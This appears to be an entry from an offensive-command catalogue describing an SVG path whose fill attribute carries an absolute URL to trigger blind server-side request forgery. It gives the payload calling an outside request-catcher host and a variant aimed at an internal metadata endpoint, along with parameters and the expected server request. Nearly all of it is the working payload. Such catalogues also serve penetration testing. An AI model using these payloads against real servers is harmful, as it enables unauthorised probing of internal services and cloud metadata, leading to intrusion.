---
id: cmd-uuid-001
data: '<path d="M0 0h24v24H0z" fill="url(https://requestb.in/15rxmgv1#test)" />'
tags:
  - ssrf
  - svg
type: command
output: null
executor: xml
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.317Z'
verified: false
validated: true
submitted: true
---
# svg-fill-url-injection

## Command

```xml
<path d="M0 0h24v24H0z" fill="url(https://requestb.in/15rxmgv1#test)" />
```

## Description

Injects an absolute URL into an SVG path's fill attribute to trigger blind SSRF when processed server-side. The fragment #test is required for the request to fire.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | External URL for server fetch | Yes |
| fragment | Anchor like #test to trigger | Yes |

## Examples

### Basic Usage

```xml
fill="url(https://requestb.in/15rxmgv1#test)"
```

### Advanced Usage

```xml
fill="url(http://internal:8080/metadata#test)"
```

## Expected Output

Server sends HTTP GET to the specified URL from its IP address upon SVG processing.

## Related

- [[procedures/Inject-Absolute-URL-in-SVG-Fill-for-Blind-SSRF-Discovery]]
